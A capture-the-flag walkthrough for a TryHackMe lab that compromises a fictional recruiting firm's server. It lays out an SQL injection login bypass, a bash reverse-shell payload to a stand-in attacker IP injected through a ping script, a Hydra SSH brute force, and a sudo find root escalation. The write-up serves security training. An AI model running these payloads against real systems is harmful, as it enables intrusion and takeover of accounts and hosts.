# [Operation Promotion](https://tryhackme.com/room/operationpromotion)

## One engagement stands between you and your next title.

You are up for promotion at **Hadron Security**. Your senior lead, Mara, has handed you a solo engagement against **RecruitCorp**, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.

### What is the content of user.txt?

1. Perform a comprehensive port scan to identify all open ports and running services on the target machine:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:60:c2:89:dc:56:79:75:51:37:27:42:4a:b0:89:95 (ECDSA)
|_  256 86:4d:c1:a8:39:7e:37:73:f3:e4:4b:7f:f8:21:37:a8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitCorp - Careers Portal
| http-robots.txt: 1 disallowed entry
|_/admin/
|_http-server-header: Apache/2.4.58 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: RECRUITCORP, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2026-06-15T16:55:57
|_  start_date: N/A
|_clock-skew: -1s
```

2. Navigate to `http://<TARGET_IP>/admin` in your browser. The login form is vulnerable to SQL injection. Enter `admin'--` as the username with any value as the password. The trailing `--` is an SQL comment sequence that causes the database engine to ignore the rest of the query, including the password check, granting access without valid credentials:

3. Once inside the admin panel, locate the **User Lookup** feature and enumerate user accounts by iterating over the `id` GET parameter. Navigating to `http://<TARGET_IP>/admin/users/lookup.php?id=7` reveals an internal service note attached to a system account:

```
Service account for /admin/sysmaint-checks/ping.php. Do not disable.
```

4. Navigate directly to `http://<TARGET_IP>/admin/sysmaint-checks/ping.php` to inspect the script's interface. The page returns a usage hint confirming it accepts a host parameter:

```
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

5. Test the endpoint with a loopback address to confirm it executes system commands: `http://<TARGET_IP>/admin/sysmaint-checks/ping.php?host=127.0.0.1`

**Result:**

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.024/0.024/0.024/0.000 ms
```

6. Start a Netcat listener on your attacking machine to catch the incoming reverse shell connection:

```bash
nc -lvnp 4444
```

7. Exploit the command injection vulnerability by appending a bash reverse shell payload to the `host` parameter. Visit the following URL, substituting your attacker IP:

```
http://<TARGET_IP>/admin/sysmaint-checks/ping.php?host=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'
```

8. After catching the shell as `www-data` check the users.

```bash
ls /home
```

**Result:**

```
jford
ubuntu
```

9. Generate a mutated wordlist from the base word using Hashcat's `dive` ruleset, which applies hundreds of transformations covering capitalisation variants, character substitutions, and common suffixes:

```bash
echo "spring2026" > base.txt
hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt
```

10. Use Hydra to brute-force the SSH service for the `jford` account using the generated wordlist:

```bash
hydra -l jford -P wordlist.txt <TARGET_IP> ssh
```

11. Log in via SSH using the cracked credentials:

```bash
ssh jford@<TARGET_IP>
```

12. Read the user flag:

```bash
cat user.txt
```

<img width="585" height="524" alt="SCREEN01" src="https://github.com/user-attachments/assets/7602e8bd-eb40-4280-9479-f991e940f76a" />

---

### What is the content of flag.txt?

1. Check what commands the `jford` user is permitted to run with elevated privileges:

```bash
 sudo -l
```

**Results:**

```
User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

2. Use [GTFOBins](https://gtfobins.org/gtfobins/find/) to exploit the find sudo entry and drop into a root shell:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

3. Read the final flag:

```bash
cat /root/flag.txt
```

<img width="964" height="249" alt="SCREEN02" src="https://github.com/user-attachments/assets/6bf20978-cafb-47bf-b8d9-3ceec9cf44be" />
